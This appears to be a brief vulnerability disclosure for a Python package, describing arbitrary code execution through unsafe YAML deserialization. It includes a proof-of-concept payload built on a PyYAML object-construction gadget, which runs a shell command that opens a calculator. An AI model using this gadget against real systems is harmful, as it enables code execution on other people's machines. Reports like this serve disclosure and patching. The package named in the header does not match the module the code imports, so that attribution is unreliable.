# Description

`router_tracker` is vulnerable to `Arbitrary Code Execution` due to insecure yaml desearilization.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

_steps to reproduce:_
```python
import markup_editor

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""
open('malicious.yaml','w+').write(payload)

markup_editor.load_yaml("malicious.yaml")
```
* `python3 exploit.py`

# Impact

Arbitrary Code Execution
